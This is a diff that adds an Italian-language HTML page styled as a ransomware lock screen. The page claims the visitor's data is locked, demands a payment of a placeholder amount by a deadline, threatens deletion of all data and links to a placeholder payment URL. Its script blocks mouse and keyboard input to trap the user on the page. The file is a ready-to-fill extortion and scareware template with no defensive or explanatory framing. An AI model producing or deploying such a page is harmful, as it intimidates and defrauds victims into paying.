@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Richiesto</title>
+    <style>
+        body {
+            background-color: red;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+        }
+        .message {
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="message">
+        <h1>I Tuoi Dati Sono Bloccati</h1>
+        <p>Per riattivare l'accesso, effettua un pagamento di [Importo] entro [Tempo Limite].</p>
+        <p>Se non paghi, tutti i tuoi dati saranno eliminati.</p>
+        <p>Clicca qui per effettuare il pagamento: <a href="[Link di Pagamento]" target="_blank">Paga Ora</a></p>
+    </div>
+
+    <script>
+        // Disabilita i tasti del mouse e della tastiera
+        document.addEventListener('mousedown', function(e) {
+            e.preventDefault();
+        });
+        document.addEventListener('keydown', function(e) {
+            e.preventDefault();
+        });
+    </script>
+</body>
+</html>
